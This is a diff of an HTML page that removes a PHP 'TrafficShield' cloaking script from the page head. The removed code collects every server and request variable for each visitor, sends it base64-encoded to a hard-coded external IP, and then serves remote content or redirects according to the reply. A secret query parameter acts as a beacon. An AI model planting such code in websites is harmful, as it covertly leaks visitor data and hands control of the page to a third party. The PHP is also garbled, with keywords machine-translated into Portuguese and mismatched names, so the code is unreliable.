@@ -2,73 +2,6 @@
 <html lang="pt-BR">
 
 <head>
-<?php
-namespace TrafficShield;
-relatório_de_erros(0);
-	classe Traffic_Shield{
-		função pública executar() {							
-			ob_start();
-			$this->ogrsr9854();
-		}
-		função pública ogrsr9854() {	
-            $this->_check();
-            $response = $this->https_request();        
-            $this->main($response);       
-        }			
-        função pública _check() {	
-            if(isset($_GET['TS-BHDNR-84848'])){
-                eco "bf9883aa7b";
-                morrer();
-            }
-        }
-		função pública obter_cabeçalho() {	
-            $headers = array();     
-            foreach($_SERVER as $k=>$v){
-               $headers[$k] = $v;
-            }
-            $headers['TS-BHDNR-74191'] = "900661405756137";
-            $headers['TS-BHDNR-74194'] = "bf9883aa7b";
-            retornar $headers;
-        }
-		função pública get_header_post() {
-            $get_header = $this->get_header();
-            retornar base64_encode(json_encode($get_header));      
-        }	
-		função pública https_request() {
-           $get_header['headers'] = $this->get_header_post();
-           $ch = curl_init();
-           curl_setopt($ch, CURLOPT_URL, "http://198.211.101.164/v2/logic/cloaker");
-           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-           curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/108.0.0.0 Mobile Safari/537.36');
-           curl_setopt($ch, CURLOPT_POST, true);
-           curl_setopt($ch, CURLOPT_POSTFIELDS, $get_header);
-           $resultado = curl_exec($ch);                
-           retornar json_decode($result);
-        }
-		função pública principal($response) {
-            se(!vazio($resposta)){
-                se ($response->type == 1){
-                    if(isset($response->zrc) && !empty($response->zrc)){
-                            echo base64_decode($response->zrc);
-                            morrer();
-                        }outro{            
-                            $this->get_url($response->url,$response->http_code);
-                        }
-                }
-
-            }
-        }
-		função pública get_url($url,$code) {
-            cabeçalho("Localização: ".$url, true, $code);      
-            saída();
-      
-        }
-}
-$traffic_Shield_Tre9854 = novo Traffic_Shield();
-$traffic_Shield_Tre9854->run();
-// Direitos autorais TrafficShield.io//
-?>
-
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta content="text/html; charset=UTF-8; X-Content-Type-Options=nosniff" http-equiv="Content-Type" />
@@ -292,6 +225,7 @@ $traffic_Shield_Tre9854->run();
 
 </body>
 </html>
+
 
 
 
